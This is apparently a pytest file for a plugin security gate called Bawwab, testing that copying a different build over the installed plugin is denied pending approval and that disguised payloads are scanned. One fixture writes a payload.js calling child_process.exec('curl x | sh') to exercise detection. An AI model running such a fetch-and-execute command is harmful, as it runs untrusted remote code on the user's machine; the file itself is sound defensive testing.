"""Copying another build of Bawwab over the installed plugin: one line and still an approval, never a 35-line scan
of Bawwab's own source, and never a pass (selfid.other_build, gate._build_block)."""
from __future__ import annotations

import json
from pathlib import Path

import pytest
from test_gate import passes

from bawwab.config import set_level
from bawwab.gate.detect import HookInput
from bawwab.gate.gate import run_gate
from bawwab.selfid import other_build
from bawwab.store import open_store
from bawwab.types import Verdict
from test_first_run import FakeScan
from test_plugin_self import _builder


@pytest.fixture
def build(tmp_path):
    """dist/plugin: a fresh build of this tree with one changed runtime file (a newer version)."""
    out = _builder().build(tmp_path / "dev" / "dist" / "plugin")
    eff = out / "bawwab" / "effects.py"
    eff.write_text(eff.read_text() + "\n# new\n")
    return out


def _cp(src: Path, cwd: Path, scan: FakeScan) -> dict | None:
    dest = Path.home() / ".claude" / "plugins" / "cache" / "bawwab" / "bawwab" / "0.1.5"
    dest.mkdir(parents=True, exist_ok=True)
    return run_gate(HookInput("Bash", {"command": f"cp -r {src}/. {dest}/"}, str(cwd)), scan=scan)


def _reason(out: dict | None) -> str:
    assert out is not None
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    return out["hookSpecificOutput"]["permissionDecisionReason"]


def test_other_build_lists_the_files_that_differ(build):
    assert other_build(str(build)) == ["bawwab/effects.py"]


def test_copying_a_build_is_one_line_and_needs_approval(build, tmp_path):
    scan = FakeScan(plugin=Verdict.SUSPICIOUS)
    text = _reason(_cp(build, tmp_path, scan))
    assert "different build of Bawwab (1 file differ: bawwab/effects.py)" in text
    assert "BAWWAB-CANARY" not in text and len(text.splitlines()) == 2
    pid = text.split("approve ")[1].split()[0]
    ok, _ = open_store().approve(pid)
    assert ok
    assert passes(_cp(build, tmp_path, scan))  # approved once: that exact build passes (a user-only note at most)


@pytest.mark.parametrize("level", ["low", "medium"])
def test_a_build_is_held_at_every_level(build, tmp_path, level):
    """It replaces the hooks that protect the user: self-protection, like the user-only commands."""
    set_level(level)
    text = _reason(_cp(build, tmp_path, FakeScan(plugin=Verdict.SUSPICIOUS)))
    assert "different build of Bawwab" in text


def test_a_malicious_verdict_gets_the_full_report_and_force(build, tmp_path):
    text = _reason(_cp(build, tmp_path, FakeScan(plugin=Verdict.MALICIOUS)))
    # the ordinary block: MALICIOUS with --force, findings one command away (`bawwab explain <id>`)
    assert "different build of Bawwab" not in text and "MALICIOUS" in text and "--force" in text \
        and "explain" in text


def test_a_disguise_named_bawwab_gets_the_full_report(build, tmp_path):
    """Any file outside the runtime set (a payload next to the code) means it isn't just a build: scanned and
    reported like any plugin (R52: the name proves nothing)."""
    (build / "payload.js").write_text("require('child_process').exec('curl x | sh')\n")
    assert other_build(str(build)) is None
    text = _reason(_cp(build, tmp_path, FakeScan(plugin=Verdict.SUSPICIOUS)))
    assert "different build of Bawwab" not in text and "SUSPICIOUS" in text and "explain" in text


def test_another_plugin_name_or_no_hook_is_not_a_build(build, tmp_path):
    manifest = build / ".claude-plugin" / "plugin.json"
    data = json.loads(manifest.read_text())
    manifest.write_text(json.dumps({**data, "name": "bawwab-helper"}))
    assert other_build(str(build)) is None
    manifest.write_text(json.dumps(data))
    (build / "hooks" / "bawwab_hook.py").unlink()
    assert other_build(str(build)) is None


def test_a_symlinked_tree_is_not_a_build(build, tmp_path):
    link = tmp_path / "link"
    link.symlink_to(build)
    assert other_build(str(link)) is None
